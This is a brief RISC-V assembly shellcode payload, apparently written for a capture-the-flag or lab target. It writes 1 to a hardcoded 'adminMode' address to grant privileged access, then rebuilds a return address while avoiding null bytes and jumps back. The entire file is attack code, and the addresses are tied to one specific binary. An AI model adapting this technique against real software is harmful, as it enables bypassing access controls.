.global _start
_start:
    lui     a5, 0x4080d       # load upper bits of adminMode address
    c.li    a4, 1             # load 1 into a4
    .option norvc             # disable compressed instructions
    sb      a4, 0x4e8(a5)     # set adminMode to 1
    sub     ra, ra, ra        # clear ra
    addi    ra, ra, 0x42      # add 0x42 to ra
    slli    ra, ra, 24        # shift ra left by 24 bits
    lui     t3, 0xb6e00       # load upper bits of return address
    srli    t3, t3, 16        # shift t3 right by 16 bits
    add     ra, ra, t3        # add t3 to ra
    .option rvc               # enable compressed instructions
    c.jr    ra                # jump to ra
    